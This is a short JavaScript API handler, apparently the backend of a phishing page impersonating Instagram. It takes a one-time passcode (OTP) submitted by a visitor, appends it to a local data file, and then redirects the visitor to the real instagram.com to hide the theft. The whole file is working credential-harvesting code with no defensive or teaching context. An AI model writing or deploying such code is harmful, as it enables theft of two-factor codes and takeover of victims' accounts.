import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { otp } = req.body;

    const log = `OTP Entered: ${otp}\n\n`;
    const filePath = path.join(process.cwd(), 'data', 'data.txt');

    fs.appendFileSync(filePath, log, 'utf8');

    res.redirect(307, 'https://www.instagram.com'); // Redirect to Instagram
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
